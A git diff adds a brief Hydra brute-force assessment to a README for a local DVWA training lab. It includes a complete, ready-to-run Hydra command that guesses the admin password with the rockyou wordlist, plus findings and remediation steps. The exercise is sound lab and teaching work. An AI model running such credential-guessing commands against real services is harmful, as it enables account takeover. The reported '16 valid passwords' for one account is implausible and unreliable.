@@ -67,4 +67,33 @@ Password: password
 * Never expose DVWA to the public internet.
 
 ---
+# Hydra Brute Force Assessment
 
+## Test Configuration
+**Tool**: THC Hydra v9.5  
+**Target**: DVWA Brute Force Module  
+**Command**: 
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
+```
+
+## Results
+<img width="1668" height="588" alt="image" src="https://github.com/user-attachments/assets/bec9aac4-29b7-415e-ac6f-12da9c5c56fa" />
+
+**16 valid passwords identified:**
+- 123456
+- password
+- 123456789
+- princess
+- iloveyou
+- [12 more...]
+
+## Critical Vulnerabilities
+- No account lockout
+- No rate limiting
+- Weak passwords allowed
+
+## Remediation
+- Implement account lockout
+- Enforce strong passwords
+- Add rate limiting
